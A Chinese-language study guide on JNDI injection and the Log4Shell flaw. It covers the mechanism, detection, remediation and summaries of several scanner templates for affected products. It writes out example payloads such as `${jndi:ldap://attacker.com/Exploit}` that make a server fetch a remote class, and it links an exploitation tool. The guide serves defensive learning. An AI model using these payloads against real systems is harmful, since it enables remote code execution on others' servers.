JNDI 注入漏洞学习文档

一、什么是 JNDI？

JNDI（Java Naming and Directory Interface）是 Java 提供的一套 API，用于访问各种命名和目录服务。它支持的协议包括：
	•	LDAP（轻量级目录访问协议）
	•	RMI（远程方法调用）
	•	DNS
	•	CORBA

开发者可以使用 JNDI 查找数据源、远程对象等资源。

⸻

二、什么是 JNDI 注入？

JNDI 注入是一种通过构造恶意的 JNDI 路径，使应用加载远程恶意类或对象的安全漏洞。攻击者可以借此实现远程代码执行（RCE）。

典型的漏洞触发形式是：程序使用了未经验证的用户输入作为 JNDI 查找路径，例如：
```java
Context ctx = new InitialContext();
Object obj = ctx.lookup(userInput);
```
当 userInput 为类似于 ldap://attacker.com/Object 的地址时，程序将访问远程服务器，并可能加载恶意对象。

三、典型案例：Log4Shell（CVE-2021-44228）

Log4Shell 是 Log4j 组件中的一个严重 JNDI 注入漏洞。

利用方式：

用户输入：${jndi:ldap://attacker.com/Exploit}
Log4j 在记录日志时解析了 ${jndi:...} 表达式，进而访问了远程 LDAP 服务器并加载了恶意类，实现了 RCE。

影响范围极广，包括大量使用 Log4j 的 Java 应用。

⸻

四、风险评估
	•	危害等级：高
	•	利用难度：中（需构建恶意 LDAP 或 RMI 服务器）
	•	影响范围：所有使用 JNDI 且未安全处理用户输入的 Java 应用

⸻

五、检测方法
	1.	检查代码是否使用了类似如下的语句：
```java
new InitialContext().lookup(userInput);
```
2.	搜索项目中是否出现如下字符串：
	•	ldap://
	•	rmi://
	•	corba://
	•	${jndi:
	3.	使用工具进行渗透测试：
	•	JNDIExploit（https://github.com/feihong-cs/JNDIExploit）

⸻

六、修复建议
	1.	严格验证和过滤用户输入，不允许用户控制 JNDI 查找路径。
	2.	升级存在漏洞的组件（例如：将 Log4j 升级至 2.16.0 或更高版本）。
	3.	禁用远程类加载功能（com.sun.jndi.ldap.object.trustURLCodebase=false）。
	4.	使用 Java 安全管理器限制远程代码执行。
	5.	网络层面封锁对外 LDAP/RMI 请求。
	6.	应用 WAF 规则拦截含 ${jndi: 等可疑 payload 的输入。

⸻

七、参考资料
	•	Apache Log4j 安全公告：https://logging.apache.org/log4j/2.x/security.html
	•	PortSwigger 关于 JNDI 注入的文章：https://portswigger.net/daily-swig/understanding-jndi-injection
	•	JNDIExploit 工具：https://github.com/feihong-cs/JNDIExploit

⸻

八、典型漏洞 YAML 文件分析

本目录下收录了多个与 JNDI 注入相关的漏洞利用模板，以下对部分典型 YAML 文件进行详细解读：

### 1. apache-solr-log4j-rce.yaml
- **漏洞类型**：JNDI 注入（Log4j RCE，CVE-2021-44228）
- **漏洞原理**：
  Apache Log4j2 <=2.14.1 在日志配置、消息和参数中使用 JNDI 特性，未对用户可控的 JNDI 路径进行有效防护。攻击者可通过构造恶意的 LDAP 地址（如 `${jndi:ldap://...}`），诱使服务端发起 JNDI 查询并加载远程恶意类，最终实现远程代码执行。
- **探测原理**：
  该 YAML 模板通过向 `/solr/admin/collections` 或 `/solr/admin/cores` 等接口注入 JNDI payload，利用 interactsh 等 OAST 平台监控 DNS 请求，若目标服务器解析 payload 并发起外部请求，则判定存在漏洞。
- **修复建议**：升级 Log4j 至 2.16.0+，禁用 JNDI 远程类加载，过滤用户输入。

### 2. graylog-log4j.yaml
- **漏洞类型**：JNDI 注入（Log4j RCE，CVE-2021-44228）
- **漏洞原理**：
  Graylog 使用易受攻击的 Log4j 版本，攻击者可通过日志记录点注入恶意 JNDI payload，触发远程类加载。
- **探测原理**：
  该模板通过 POST 请求向 Graylog API 注入 `${jndi:ldap://...}`，并监控外部 DNS 请求，判断是否存在漏洞。
- **修复建议**：升级 Log4j，过滤日志相关输入。

### 3. vmware-horizon-log4j-jndi-rce.yaml
- **漏洞类型**：JNDI 注入（Log4j RCE，CVE-2021-44228）
- **漏洞原理**：
  VMware Horizon 集成了易受攻击的 Log4j 版本，攻击者可通过 Accept-Language 等 HTTP 头注入 JNDI payload，诱使服务端发起恶意请求。
- **探测原理**：
  该模板通过 GET 请求在 Accept-Language 头中注入 `${jndi:...}`，并监控 interactsh 平台的 DNS 请求，判断漏洞是否存在。
- **修复建议**：升级 VMware Horizon 及其依赖组件，限制外部访问。

### 4. f-secure-policymanager-log4j-rce.yaml
- **漏洞类型**：JNDI 注入（Log4j RCE，CVE-2021-44228）
- **漏洞原理**：
  F-Secure Policy Manager 使用了受影响的 Log4j 版本，攻击者可通过特定参数注入 JNDI payload，触发远程代码执行。
- **探测原理**：
  该模板通过 GET 请求在参数中注入 `${jndi:ldap://...}`，并监控外部 DNS 请求，判断是否存在漏洞。
- **修复建议**：升级组件，过滤输入。

---

#### 总结
这些 YAML 文件均为 JNDI 注入漏洞的利用模板，核心原理是通过未过滤的用户输入，诱使后端 Java 应用通过 JNDI 机制加载远程恶意对象，最终实现远程代码执行。探测方式通常为注入特制 JNDI payload 并监控目标是否发起外部请求（如 DNS/LDAP），以此判断漏洞是否存在。

**防御措施主要包括：**
- 严格校验和过滤用户输入
- 升级相关依赖组件（如 Log4j）
- 禁用 JNDI 远程类加载
- 加强网络层访问控制
